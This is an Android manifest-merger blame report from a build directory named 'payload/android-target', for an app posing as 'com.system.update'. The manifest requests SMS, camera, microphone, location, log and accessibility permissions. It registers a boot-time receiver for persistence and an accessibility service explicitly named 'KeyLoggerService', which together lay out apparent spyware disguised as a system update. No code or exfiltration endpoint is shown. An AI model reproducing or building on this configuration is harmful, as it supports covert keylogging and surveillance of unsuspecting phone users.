payload/android-target/app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.system.update"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="33" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src\main\AndroidManifest.xml:5:5-67
11-->src\main\AndroidManifest.xml:5:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src\main\AndroidManifest.xml:6:5-79
12-->src\main\AndroidManifest.xml:6:22-76
13    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
13-->src\main\AndroidManifest.xml:7:5-76
13-->src\main\AndroidManifest.xml:7:22-73
14    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
14-->src\main\AndroidManifest.xml:8:5-80
14-->src\main\AndroidManifest.xml:8:22-77
15    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
15-->src\main\AndroidManifest.xml:9:5-81
15-->src\main\AndroidManifest.xml:9:22-78
16    <uses-permission android:name="android.permission.CAMERA" />
16-->src\main\AndroidManifest.xml:10:5-65
16-->src\main\AndroidManifest.xml:10:22-62
17    <uses-permission android:name="android.permission.RECORD_AUDIO" />
17-->src\main\AndroidManifest.xml:11:5-71
17-->src\main\AndroidManifest.xml:11:22-68
18    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
18-->src\main\AndroidManifest.xml:12:5-79
18-->src\main\AndroidManifest.xml:12:22-76
19    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
19-->src\main\AndroidManifest.xml:13:5-81
19-->src\main\AndroidManifest.xml:13:22-78
20    <uses-permission android:name="android.permission.READ_SMS" />
20-->src\main\AndroidManifest.xml:14:5-67
20-->src\main\AndroidManifest.xml:14:22-64
21    <uses-permission android:name="android.permission.RECEIVE_SMS" />
21-->src\main\AndroidManifest.xml:15:5-70
21-->src\main\AndroidManifest.xml:15:22-67
22    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
22-->src\main\AndroidManifest.xml:16:5-75
22-->src\main\AndroidManifest.xml:16:22-72
23    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
23-->src\main\AndroidManifest.xml:17:5-78
23-->src\main\AndroidManifest.xml:17:22-75
24    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
24-->src\main\AndroidManifest.xml:18:5-77
24-->src\main\AndroidManifest.xml:18:22-74
25    <uses-permission android:name="android.permission.WAKE_LOCK" />
25-->src\main\AndroidManifest.xml:19:5-68
25-->src\main\AndroidManifest.xml:19:22-65
26    <uses-permission android:name="android.permission.VIBRATE" />
26-->src\main\AndroidManifest.xml:20:5-66
26-->src\main\AndroidManifest.xml:20:22-63
27    <uses-permission android:name="android.permission.READ_LOGS" />
27-->src\main\AndroidManifest.xml:21:5-68
27-->src\main\AndroidManifest.xml:21:22-65
28    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
28-->src\main\AndroidManifest.xml:22:5-78
28-->src\main\AndroidManifest.xml:22:22-75
29    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
29-->src\main\AndroidManifest.xml:23:5-85
29-->src\main\AndroidManifest.xml:23:22-82
30    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
30-->src\main\AndroidManifest.xml:24:5-95
30-->src\main\AndroidManifest.xml:24:22-92
31
32    <permission
32-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
33        android:name="com.system.update.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
33-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
34        android:protectionLevel="signature" />
34-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
35
36    <uses-permission android:name="com.system.update.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
36-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
36-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
37
38    <application
38-->src\main\AndroidManifest.xml:26:5-73:19
39        android:allowBackup="true"
39-->src\main\AndroidManifest.xml:27:9-35
40        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
40-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
41        android:extractNativeLibs="false"
42        android:icon="@android:drawable/ic_menu_rotate"
42-->src\main\AndroidManifest.xml:28:9-56
43        android:label="@string/app_name"
43-->src\main\AndroidManifest.xml:29:9-41
44        android:theme="@style/Theme.App"
44-->src\main\AndroidManifest.xml:30:9-41
45        android:usesCleartextTraffic="true" >
45-->src\main\AndroidManifest.xml:31:9-44
46        <activity
46-->src\main\AndroidManifest.xml:33:9-41:20
47            android:name="com.system.update.MainActivity"
47-->src\main\AndroidManifest.xml:33:19-47
48            android:exported="true"
48-->src\main\AndroidManifest.xml:34:13-36
49            android:launchMode="singleTask"
49-->src\main\AndroidManifest.xml:35:13-44
50            android:screenOrientation="portrait" >
50-->src\main\AndroidManifest.xml:36:13-49
51            <intent-filter>
51-->src\main\AndroidManifest.xml:37:13-40:29
52                <action android:name="android.intent.action.MAIN" />
52-->src\main\AndroidManifest.xml:38:17-69
52-->src\main\AndroidManifest.xml:38:25-66
53
54                <category android:name="android.intent.category.LAUNCHER" />
54-->src\main\AndroidManifest.xml:39:17-77
54-->src\main\AndroidManifest.xml:39:27-74
55            </intent-filter>
56        </activity>
57
58        <service
58-->src\main\AndroidManifest.xml:43:9-45:56
59            android:name="com.system.update.UpdateService"
59-->src\main\AndroidManifest.xml:43:18-47
60            android:exported="false"
60-->src\main\AndroidManifest.xml:44:13-37
61            android:foregroundServiceType="dataSync" />
61-->src\main\AndroidManifest.xml:45:13-53
62
63        <receiver
63-->src\main\AndroidManifest.xml:47:9-53:20
64            android:name="com.system.update.BootReceiver"
64-->src\main\AndroidManifest.xml:47:19-47
65            android:exported="true" >
65-->src\main\AndroidManifest.xml:48:13-36
66            <intent-filter>
66-->src\main\AndroidManifest.xml:49:13-52:29
67                <action android:name="android.intent.action.BOOT_COMPLETED" />
67-->src\main\AndroidManifest.xml:50:17-79
67-->src\main\AndroidManifest.xml:50:25-76
68                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
68-->src\main\AndroidManifest.xml:51:17-79
68-->src\main\AndroidManifest.xml:51:25-76
69            </intent-filter>
70        </receiver>
71
72        <service
72-->src\main\AndroidManifest.xml:55:9-63:19
73            android:name="com.system.update.KeyLoggerService"
73-->src\main\AndroidManifest.xml:55:18-50
74            android:exported="true"
74-->src\main\AndroidManifest.xml:57:13-36
75            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
75-->src\main\AndroidManifest.xml:56:13-79
76            <intent-filter>
76-->src\main\AndroidManifest.xml:58:13-60:29
77                <action android:name="android.accessibilityservice.AccessibilityService" />
77-->src\main\AndroidManifest.xml:59:17-92
77-->src\main\AndroidManifest.xml:59:25-89
78            </intent-filter>
79
80            <meta-data
80-->src\main\AndroidManifest.xml:61:13-62:64
81                android:name="android.accessibilityservice"
81-->src\main\AndroidManifest.xml:61:24-67
82                android:resource="@xml/accessibility_config" />
82-->src\main\AndroidManifest.xml:62:17-61
83        </service>
84
85        <provider
85-->src\main\AndroidManifest.xml:65:9-71:20
86            android:name="androidx.core.content.FileProvider"
86-->src\main\AndroidManifest.xml:65:19-68
87            android:authorities="com.system.update.fileprovider"
87-->src\main\AndroidManifest.xml:66:13-65
88            android:exported="false"
88-->src\main\AndroidManifest.xml:67:13-37
89            android:grantUriPermissions="true" >
89-->src\main\AndroidManifest.xml:68:13-47
90            <meta-data
90-->src\main\AndroidManifest.xml:69:13-70:54
91                android:name="android.support.FILE_PROVIDER_PATHS"
91-->src\main\AndroidManifest.xml:69:24-74
92                android:resource="@xml/file_paths" />
92-->src\main\AndroidManifest.xml:70:17-51
93        </provider>
94        <provider
94-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
95            android:name="androidx.startup.InitializationProvider"
95-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
96            android:authorities="com.system.update.androidx-startup"
96-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
97            android:exported="false" >
97-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
98            <meta-data
98-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
99                android:name="androidx.emoji2.text.EmojiCompatInitializer"
99-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
100                android:value="androidx.startup" />
100-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
101            <meta-data
101-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:31:13-33:52
102                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
102-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:32:17-78
103                android:value="androidx.startup" />
103-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:33:17-49
104        </provider>
105    </application>
106
107</manifest>